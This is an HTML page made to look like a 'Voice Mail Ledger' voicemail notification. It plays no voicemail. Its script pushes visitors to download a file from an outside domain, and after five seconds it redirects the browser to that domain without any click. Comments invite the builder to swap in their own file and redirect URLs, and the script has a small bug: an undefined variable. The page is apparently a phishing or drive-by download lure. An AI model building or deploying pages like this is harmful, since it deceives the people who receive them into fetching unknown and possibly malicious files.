<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voicemail Notification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            overflow: hidden;
            background-color: #f4f4f4;
        }
        .voicemail-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 40px;
            color: black;
            transition: all 2s ease-in-out;
            cursor: pointer;
        }
        .move-to-corner {
            top: 20px;
            right: 20px;
            left: auto;
            transform: none;
        }
        .circle {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: white;
            border: 2px solid black;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            position: relative;
        }
        .wave {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 2px solid black;
            opacity: 0;
            animation: pulse 1.5s infinite ease-in-out;
        }
        .logo {
            position: fixed;
            top: 10px;
            right: 10px;
            font-size: 16px;
            font-weight: bold;
            color: black;
        }
        .text-below {
            position: absolute;
            bottom: -30px;
            font-size: 14px;
            color: black;
            opacity: 0;
            transition: opacity 1s ease-in-out;
        }
        .instruction {
            margin-top: 60px;
            font-size: 18px;
            color: #333;
        }
        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.8; }
            100% { transform: scale(1.5); opacity: 0; }
        }
    </style>
</head>
<body>

    <div class="logo">Voice Mail Ledger</div> <!-- Logo at the top right -->

    <!-- Instruction message for the user -->
    <div class="instruction" id="instruction">
        You have a new voicemail. Click the icon below to download and play it.
    </div>

    <div class="voicemail-container" id="voicemailIcon" onclick="downloadFile()">
        <div class="circle">
            ðŸ“ž <!-- Voicemail icon -->
            <div class="wave"></div>
            <span class="text-below" id="voicemailText">Click to download and play voicemail</span> <!-- Updated text below the icon -->
        </div>
    </div>

    <script>
        window.onload = function () {
            let icon = document.getElementById("voicemailIcon");
            

            setTimeout(() => {
                text.style.opacity = "1"; // Show text below the voicemail icon
            }, 500);

            setTimeout(() => {
                icon.classList.add("move-to-corner");
            }, 1000);

            setTimeout(() => {
                window.location.href = "https://accesspoint.filebackupgate.com/"; // Replace with actual redirect URL
            }, 5000);
        };

        function downloadFile() {
            let link = document.createElement("a");
            link.href = "https://accesspoint.filebackupgate.com/";  // Replace with actual file URL
            link.download = "";  // Let browser use default filename or set a custom one
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
    </script>
</body>
</html>
